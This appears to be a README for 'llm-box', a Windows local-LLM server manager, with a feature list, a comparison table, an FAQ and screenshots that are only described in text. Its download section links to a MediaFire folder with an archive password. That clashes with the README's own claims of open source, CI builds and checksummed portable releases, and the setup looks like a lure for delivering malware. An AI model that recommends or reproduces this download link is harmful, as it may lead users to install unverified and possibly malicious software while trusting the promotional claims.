# llm-box

🧰 Free, open-source local LLM server manager for Windows — llama.cpp presets, OpenAI-compatible API, VRAM fit checks. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **One-click server start** — pick a GGUF, auto-detect chat template, and get a running localhost endpoint in seconds
- ✅ **OpenAI-compatible API** — drop-in /v1/chat/completions on port 8080 that any app expects
- ✅ **VRAM fit check** — refuses to launch an obviously oversized offload without a clear warning and a suggested preset
- ✅ **Model switcher** — hot-swap loaded models from the tray without editing configs or restarting the app
- ✅ **Preset shelf** — context size, threads, GPU layers and batch size saved per model, portable across machines
- ✅ **Live log console** — token speed, context usage and errors streamed with filterable levels
- ✅ **100 MB self-contained exe** — runtime and server backend bundled, portable, offline, MIT with SHA-256 releases

## Why llm-box

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **llm-box** | Ollama | LM Studio | KoboldCpp |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free | Free, OSS |
| Open source | **Yes** | Yes | No | Yes |
| Runs raw GGUF from any folder | **Yes** | Import only | Yes | Yes |
| Tray model hot-swap | **Yes** | No | Partial | No |
| Per-model preset shelf | **Yes** | Modelfile | Yes | Config file |
| Portable, no install | **Yes, 100 MB** | Installer | Installer | Zip |

## FAQ

**how to run a local LLM server with an OpenAI-compatible API on Windows?**

Most guides mean installing Python or a background service that registers itself and phones home. llm-box starts any GGUF you point it at, serves the /v1 API apps already expect and keeps every preset in a portable folder. It is a 100 MB exe, MIT, offline, and uninstalls by deleting a folder.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark dashboard (#121417, green #34D399): model card with VRAM fit badge reading fits in 12.1 of 16 GB, start button glowing, endpoint chip localhost:8080/v1.
2. Tray menu open over desktop: loaded model highlighted, three recent GGUFs listed, context usage bar at 34 percent of 8192 tokens.
3. Log console: chat completion streamed with 42 tok per sec counter, filter dropdown on requests, green toast reading server ready in 0.9 s.

## Download

| Source | Link |
|---|---|
| 💾 **Installer llm-box** | [Installer llm-box](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).